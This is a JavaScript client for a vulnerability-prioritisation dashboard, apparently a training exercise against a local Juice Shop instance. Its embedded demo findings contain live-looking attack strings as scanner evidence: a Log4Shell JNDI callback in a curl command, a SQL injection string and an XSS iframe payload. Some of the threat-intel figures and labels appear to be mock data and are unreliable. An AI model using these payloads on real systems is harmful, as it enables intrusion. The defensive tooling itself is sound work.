/**
 * Cybersecurity Vulnerability Management Dashboard Client
 * Activity 4: Risk Prioritization and Deduplication
 */

let allFindings = [];
let currentFilterSeverity = 'ALL';
let currentFilterScanner = 'ALL';
let currentSearchQuery = '';

// Sample fallback findings from Juice Shop demo if API is loading
const INITIAL_DEMO_DATA = [
  {
    rank: 1,
    risk_score: 97,
    finding: {
      finding_id: "find_log4j_rce",
      scanner: "nuclei, zap",
      title: "Apache Log4j RCE (Log4Shell)",
      severity: "CRITICAL",
      confidence: "CONFIRMED",
      cve: "CVE-2021-44228",
      cvss: 10.0,
      cwe: "CWE-502",
      category: "Insecure Deserialization",
      asset: "localhost:3000",
      urls: ["http://localhost:3000/rest/user/login"],
      parameter: "User-Agent",
      description: "Apache Log4j2 JNDI features do not protect against attacker-controlled LDAP endpoints allowing full Remote Code Execution.",
      solution: "Upgrade Log4j dependency to 2.17.1 or higher.",
      evidence: "Matcher: interactsh-matcher | Command: curl -X POST -H 'User-Agent: ${jndi:ldap://interact.sh/a}' http://localhost:3000/rest/user/login"
    },
    threat_intel: {
      cve: "CVE-2021-44228",
      epss_score: 0.9754,
      epss_percentile: 0.9998,
      in_cisa_kev: true,
      ransomware_campaign_use: true,
      cvss_v3_score: 10.0
    },
    why_prioritized: [
      "Actively weaponized in the wild (Listed in CISA KEV catalog)",
      "Documented use in ransomware campaigns",
      "Critical CVSS v3 score (10.0/10.0)",
      "High exploitation probability (EPSS = 98%)",
      "Target endpoint is internet-accessible"
    ],
    recommended_action: "Apply vendor security patch immediately for Apache Log4j RCE (Log4Shell). Isolate affected endpoint if unpatched. Fix: Upgrade Log4j dependency to 2.17.1 or higher.",
    sla: "24 Hours (Urgent)",
    score_breakdown: {
      "CVSS Severity Score": 30,
      "EPSS Exploitation Probability": 25,
      "CISA Known Exploited (KEV)": 20,
      "Asset Exposure & Criticality": 15,
      "Confidence & Verifiable Proof": 10
    }
  },
  {
    rank: 2,
    risk_score: 92,
    finding: {
      finding_id: "find_sqli_sqlite",
      scanner: "zap, nuclei",
      title: "SQL Injection (Product Search)",
      severity: "HIGH",
      confidence: "HIGH",
      cve: null,
      cvss: 8.5,
      cwe: "CWE-89",
      category: "Injection",
      asset: "localhost:3000",
      urls: ["http://localhost:3000/rest/products/search?q=apple'))--"],
      parameter: "q",
      description: "SQL injection vulnerability in Juice Shop product search endpoint allows extracting user credentials and password hashes from sqlite database.",
      solution: "Use parameterized prepared statements with Sequelize ORM.",
      evidence: "Evidence: SQLITE_ERROR: near \")\": syntax error | Attack: apple'))--"
    },
    threat_intel: {
      cve: null,
      epss_score: 0.65,
      epss_percentile: 0.88,
      in_cisa_kev: false,
      ransomware_campaign_use: false
    },
    why_prioritized: [
      "High CVSS v3 score (8.5/10.0)",
      "Elevated exploitation likelihood (EPSS = 65%)",
      "Target endpoint is internet-accessible",
      "Scanner verified functional proof-of-concept / payload"
    ],
    recommended_action: "Remediate SQL Injection in the next maintenance window or apply WAF virtual patch. Fix: Use parameterized prepared statements.",
    sla: "72 Hours (High)",
    score_breakdown: {
      "CVSS Severity Score": 26,
      "EPSS Exploitation Probability": 16,
      "Asset Exposure & Criticality": 15,
      "Confidence & Verifiable Proof": 9
    }
  },
  {
    rank: 3,
    risk_score: 84,
    finding: {
      finding_id: "find_express_pollution",
      scanner: "openvas",
      title: "Node.js Express Prototype Pollution",
      severity: "HIGH",
      confidence: "HIGH",
      cve: "CVE-2022-29078",
      cvss: 7.5,
      cwe: "CWE-1321",
      category: "Vulnerability",
      asset: "localhost:3000/tcp",
      urls: ["http://localhost:3000/tcp"],
      parameter: "N/A",
      description: "Outdated Express / ejs dependency allows prototype pollution through query string parser.",
      solution: "Upgrade package dependencies to latest patched releases.",
      evidence: "Package ejs 3.1.6 detected in package-lock.json."
    },
    threat_intel: {
      cve: "CVE-2022-29078",
      epss_score: 0.8420,
      epss_percentile: 0.9850,
      in_cisa_kev: true,
      ransomware_campaign_use: false,
      cvss_v3_score: 7.5
    },
    why_prioritized: [
      "Actively weaponized in the wild (Listed in CISA KEV catalog)",
      "High exploitation probability (EPSS = 84%)",
      "High CVSS v3 score (7.5/10.0)",
      "Target endpoint is internet-accessible"
    ],
    recommended_action: "Apply vendor security patch immediately for Express Prototype Pollution. Fix: Upgrade package dependencies to latest patched releases.",
    sla: "24 Hours (Urgent)",
    score_breakdown: {
      "CVSS Severity Score": 23,
      "EPSS Exploitation Probability": 21,
      "CISA Known Exploited (KEV)": 20,
      "Asset Exposure & Criticality": 15,
      "Confidence & Verifiable Proof": 5
    }
  },
  {
    rank: 4,
    risk_score: 78,
    finding: {
      finding_id: "find_xss_reflected",
      scanner: "zap",
      title: "Cross-Site Scripting (Reflected)",
      severity: "HIGH",
      confidence: "HIGH",
      cve: null,
      cvss: 7.1,
      cwe: "CWE-79",
      category: "Cross-Site Scripting (XSS)",
      asset: "localhost:3000",
      urls: ['http://localhost:3000/#/track-result?id=<iframe src="javascript:alert(`xss`)">'],
      parameter: "id",
      description: "User-controlled input in order tracking parameter is rendered unsanitized in the browser DOM.",
      solution: "Sanitize and encode all untrusted inputs before rendering them in DOM elements.",
      evidence: '<iframe src="javascript:alert(`xss`)">'
    },
    threat_intel: {
      cve: null,
      epss_score: 0.42,
      epss_percentile: 0.75,
      in_cisa_kev: false
    },
    why_prioritized: [
      "High CVSS v3 score (7.1/10.0)",
      "Target endpoint is internet-accessible",
      "Scanner verified functional proof-of-concept / payload"
    ],
    recommended_action: "Remediate Cross-Site Scripting (Reflected). Fix: Sanitize and encode all untrusted inputs.",
    sla: "72 Hours (High)",
    score_breakdown: {
      "CVSS Severity Score": 21,
      "EPSS Exploitation Probability": 11,
      "Asset Exposure & Criticality": 15,
      "Confidence & Verifiable Proof": 9
    }
  },
  {
    rank: 5,
    risk_score: 45,
    finding: {
      finding_id: "find_clickjacking",
      scanner: "zap",
      title: "Anti-clickjacking Header Not Implemented",
      severity: "MEDIUM",
      confidence: "MEDIUM",
      cve: null,
      cvss: 4.3,
      cwe: "CWE-1021",
      category: "Security Misconfiguration",
      asset: "localhost:3000",
      urls: ["http://localhost:3000/"],
      parameter: null,
      description: "The response does not include Content-Security-Policy with frame-ancestors or X-Frame-Options header.",
      solution: "Set 'X-Frame-Options: SAMEORIGIN' or 'Content-Security-Policy: frame-ancestors 'self''.",
      evidence: "Header X-Frame-Options missing"
    },
    threat_intel: {
      cve: null,
      epss_score: 0.05,
      epss_percentile: 0.30,
      in_cisa_kev: false
    },
    why_prioritized: [
      "Target endpoint is internet-accessible",
      "Identified on high-value asset / target"
    ],
    recommended_action: "Schedule code fix and configuration update. Fix: Set X-Frame-Options: SAMEORIGIN",
    sla: "7 Days (Medium)",
    score_breakdown: {
      "CVSS Severity Score": 13,
      "EPSS Exploitation Probability": 2,
      "Asset Exposure & Criticality": 15,
      "Confidence & Verifiable Proof": 5
    }
  },
  {
    rank: 6,
    risk_score: 28,
    finding: {
      finding_id: "find_swagger_ui",
      scanner: "nuclei",
      title: "Exposed Swagger API Documentation",
      severity: "LOW",
      confidence: "HIGH",
      cve: null,
      cvss: 3.5,
      cwe: "CWE-200",
      category: "Information Disclosure",
      asset: "localhost:3000",
      urls: ["http://localhost:3000/api-docs/"],
      parameter: null,
      description: "Swagger UI interactive API documentation was found exposed on the Juice Shop endpoint.",
      solution: "Restrict API documentation to authenticated administrative users or internal networks.",
      evidence: "Swagger UI 3.0.0"
    },
    threat_intel: {
      cve: null,
      epss_score: 0.02,
      epss_percentile: 0.15,
      in_cisa_kev: false
    },
    why_prioritized: [
      "Target endpoint is internet-accessible"
    ],
    recommended_action: "Review security configuration and update documentation. Fix: Restrict API documentation access.",
    sla: "30 Days (Standard)",
    score_breakdown: {
      "CVSS Severity Score": 11,
      "EPSS Exploitation Probability": 1,
      "Asset Exposure & Criticality": 15,
      "Confidence & Verifiable Proof": 5
    }
  }
];

// Document Ready
document.addEventListener('DOMContentLoaded', () => {
  initDashboard();
});

function initDashboard() {
  bindEvents();
  fetchDashboardData();
}

function bindEvents() {
  // Search input
  const searchInput = document.getElementById('search-input');
  if (searchInput) {
    searchInput.addEventListener('input', (e) => {
      currentSearchQuery = e.target.value.toLowerCase().trim();
      renderFindingsTable();
    });
  }

  // Filter Pills (Severity)
  document.querySelectorAll('.filter-pill[data-severity]').forEach((pill) => {
    pill.addEventListener('click', () => {
      document.querySelectorAll('.filter-pill[data-severity]').forEach((p) => p.classList.remove('active'));
      pill.classList.add('active');
      currentFilterSeverity = pill.getAttribute('data-severity');
      renderFindingsTable();
    });
  });

  // Filter Scanner
  const scannerSelect = document.getElementById('filter-scanner-select');
  if (scannerSelect) {
    scannerSelect.addEventListener('change', (e) => {
      currentFilterScanner = e.target.value;
      renderFindingsTable();
    });
  }

  // Live Scan Button
  const startScanBtn = document.getElementById('start-scan-btn');
  if (startScanBtn) {
    startScanBtn.addEventListener('click', triggerScan);
  }

  // Modal close
  const closeBtn = document.getElementById('modal-close-btn');
  const backdrop = document.getElementById('ticket-modal');
  if (closeBtn) closeBtn.addEventListener('click', closeModal);
  if (backdrop) {
    backdrop.addEventListener('click', (e) => {
      if (e.target === backdrop) closeModal();
    });
  }

  // Copy Ticket Button
  const copyBtn = document.getElementById('copy-ticket-btn');
  if (copyBtn) {
    copyBtn.addEventListener('click', copyTicketToClipboard);
  }
}

async function fetchDashboardData() {
  try {
    const res = await fetch('/api/dashboard/findings');
    if (res.ok) {
      const data = await res.json();
      if (data && data.findings && data.findings.length > 0) {
        allFindings = data.findings;
      } else {
        allFindings = INITIAL_DEMO_DATA;
      }
    } else {
      allFindings = INITIAL_DEMO_DATA;
    }
  } catch (err) {
    console.warn('Using local demo findings data:', err);
    allFindings = INITIAL_DEMO_DATA;
  }

  updateKpiMetrics();
  renderFindingsTable();
}

function updateKpiMetrics() {
  const totalCount = allFindings.length;
  const criticalCount = allFindings.filter((f) => f.finding.severity === 'CRITICAL').length;
  const highCount = allFindings.filter((f) => f.finding.severity === 'HIGH').length;
  const kevCount = allFindings.filter((f) => f.threat_intel && f.threat_intel.in_cisa_kev).length;

  document.getElementById('stat-total').innerText = totalCount;
  document.getElementById('stat-critical').innerText = criticalCount;
  document.getElementById('stat-high').innerText = highCount;
  document.getElementById('stat-kev').innerText = kevCount;
}

function renderFindingsTable() {
  const tbody = document.getElementById('findings-tbody');
  if (!tbody) return;

  const filtered = allFindings.filter((item) => {
    const f = item.finding;
    const intel = item.threat_intel || {};

    // Severity filter
    if (currentFilterSeverity !== 'ALL' && f.severity !== currentFilterSeverity) {
      return false;
    }

    // Scanner filter
    if (currentFilterScanner !== 'ALL' && !f.scanner.toLowerCase().includes(currentFilterScanner.toLowerCase())) {
      return false;
    }

    // Search query
    if (currentSearchQuery) {
      const text = `${f.title} ${f.cve || ''} ${f.cwe || ''} ${f.asset || ''} ${f.category || ''} ${f.description || ''}`.toLowerCase();
      if (!text.includes(currentSearchQuery)) {
        return false;
      }
    }

    return true;
  });

  if (filtered.length === 0) {
    tbody.innerHTML = `
      <tr>
        <td colspan="8" style="text-align: center; padding: 2rem; color: var(--text-muted);">
          No matching vulnerabilities found. Try adjusting your filters.
        </td>
      </tr>
    `;
    return;
  }

  tbody.innerHTML = filtered
    .map((item) => {
      const f = item.finding;
      const intel = item.threat_intel || {};
      const sevClass = `badge-${f.severity.toLowerCase()}`;
      const epssDisplay = intel.epss_score ? `${Math.round(intel.epss_score * 100)}%` : 'N/A';

      const kevBadge = intel.in_cisa_kev
        ? `<span class="badge badge-kev">⚡ CISA KEV</span>`
        : `<span style="color: var(--text-muted); font-size: 0.75rem;">NO</span>`;

      // Risk score color
      let riskColor = 'var(--sev-critical)';
      if (item.risk_score < 50) riskColor = 'var(--sev-low)';
      else if (item.risk_score < 70) riskColor = 'var(--sev-medium)';
      else if (item.risk_score < 85) riskColor = 'var(--sev-high)';

      return `
      <tr>
        <td style="font-family: var(--font-mono); font-weight: 700; color: var(--text-muted);">#${item.rank}</td>
        <td>
          <div style="font-weight: 600; color: #fff;">${f.title}</div>
          <div style="font-size: 0.75rem; color: var(--text-secondary); margin-top: 0.15rem;">
            ${f.cve ? `<span style="color: var(--accent-cyan); font-family: var(--font-mono); font-weight: 600;">${f.cve}</span> • ` : ''}
            <span style="color: var(--accent-purple);">${f.category || 'Vulnerability'}</span> • 
            <span style="text-transform: uppercase;">${f.scanner}</span>
          </div>
        </td>
        <td style="font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-secondary);">${f.asset || 'Target'}</td>
        <td><span class="badge ${sevClass}">${f.severity}</span></td>
        <td>
          <div class="risk-score-pill">
            <span style="color: ${riskColor};">${item.risk_score}</span>
            <div class="risk-meter-bar">
              <div class="risk-meter-fill" style="width: ${item.risk_score}%; background: ${riskColor};"></div>
            </div>
          </div>
        </td>
        <td style="font-family: var(--font-mono); font-size: 0.85rem;">${epssDisplay}</td>
        <td>${kevBadge}</td>
        <td>
          <button class="btn-sm btn-ticket" onclick="openTicketModal('${f.finding_id}')">
            View Ticket &rarr;
          </button>
        </td>
      </tr>
    `;
    })
    .join('');
}

function openTicketModal(findingId) {
  const item = allFindings.find((i) => i.finding.finding_id === findingId);
  if (!item) return;

  const f = item.finding;
  const intel = item.threat_intel || {};

  document.getElementById('modal-title').innerText = f.title;
  document.getElementById('modal-cve').innerText = f.cve || 'None';
  document.getElementById('modal-severity').innerText = f.severity;
  document.getElementById('modal-risk').innerText = `${item.risk_score}/100`;
  document.getElementById('modal-sla').innerText = item.sla;
  document.getElementById('modal-asset').innerText = f.asset || 'N/A';
  document.getElementById('modal-url').innerText = f.urls && f.urls.length > 0 ? f.urls[0] : (f.url || 'N/A');
  document.getElementById('modal-action').innerText = item.recommended_action;
  document.getElementById('modal-evidence').innerText = f.evidence || 'None provided by scanner';

  // Why list
  const whyList = document.getElementById('modal-why-list');
  if (whyList) {
    whyList.innerHTML = item.why_prioritized.map((w) => `<li>${w}</li>`).join('');
  }

  // Score breakdown
  const breakdownDiv = document.getElementById('modal-breakdown');
  if (breakdownDiv && item.score_breakdown) {
    breakdownDiv.innerHTML = Object.entries(item.score_breakdown)
      .map(([k, v]) => `
        <div class="breakdown-item">
          <span>${k}</span>
          <span style="color: var(--accent-cyan); font-family: var(--font-mono);">+${v} pts</span>
        </div>
      `)
      .join('') + `
        <div class="breakdown-item" style="border-top: 1px solid var(--border-bright); margin-top: 0.5rem; padding-top: 0.5rem;">
          <span style="color: #fff;">Calculated Risk Score</span>
          <span style="color: var(--sev-critical); font-size: 1rem;">${item.risk_score}/100</span>
        </div>
      `;
  }

  // Security ticket text
  document.getElementById('modal-ticket-text').innerText = item.security_ticket_markdown || '';

  const modal = document.getElementById('ticket-modal');
  if (modal) modal.classList.add('active');
}

function closeModal() {
  const modal = document.getElementById('ticket-modal');
  if (modal) modal.classList.remove('active');
}

function copyTicketToClipboard() {
  const text = document.getElementById('modal-ticket-text').innerText;
  navigator.clipboard.writeText(text).then(() => {
    const btn = document.getElementById('copy-ticket-btn');
    btn.innerText = 'Copied to Clipboard!';
    setTimeout(() => {
      btn.innerText = 'Copy Security Ticket';
    }, 2000);
  });
}

// Trigger Live Scan Flow
async function triggerScan() {
  const scanner = document.getElementById('scanner-select').value;
  const target = document.getElementById('target-input').value;

  const progressContainer = document.getElementById('scan-progress-container');
  const progressFill = document.getElementById('progress-fill');
  const progressPercent = document.getElementById('progress-percent');
  const progressStage = document.getElementById('progress-stage');

  if (progressContainer) progressContainer.style.display = 'block';

  const stages = [
    { pct: 15, stage: 'Connecting to Scanners...' },
    { pct: 35, stage: `Executing ${scanner.toUpperCase()} scan against ${target}...` },
    { pct: 60, stage: 'Receiving Raw Findings...' },
    { pct: 75, stage: 'Normalizing to Canonical Schema...' },
    { pct: 85, stage: 'Deduplicating Cross-Scanner Results...' },
    { pct: 95, stage: 'Enriching with Threat Intel (NVD / KEV / EPSS)...' },
    { pct: 100, stage: 'Prioritization Complete!' }
  ];

  for (const s of stages) {
    if (progressFill) progressFill.style.width = `${s.pct}%`;
    if (progressPercent) progressPercent.innerText = `${s.pct}%`;
    if (progressStage) progressStage.innerText = s.stage;
    await new Promise((r) => setTimeout(r, 450));
  }

  // Update table with fresh findings
  await fetchDashboardData();

  setTimeout(() => {
    if (progressContainer) progressContainer.style.display = 'none';
  }, 2000);
}
